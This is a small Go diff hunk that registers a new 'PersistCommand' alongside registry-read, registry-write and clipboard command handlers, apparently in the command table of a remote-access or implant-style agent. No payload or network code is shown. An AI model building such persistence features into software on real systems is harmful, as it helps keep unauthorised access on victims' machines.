@@ -63,6 +63,7 @@ func Initialize() {
 		RegisterCommand(&RegReadCommand{})
 		RegisterCommand(&RegWriteCommand{})
 		RegisterCommand(&ClipboardCommand{})
+		RegisterCommand(&PersistCommand{})
 	}
 
 	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
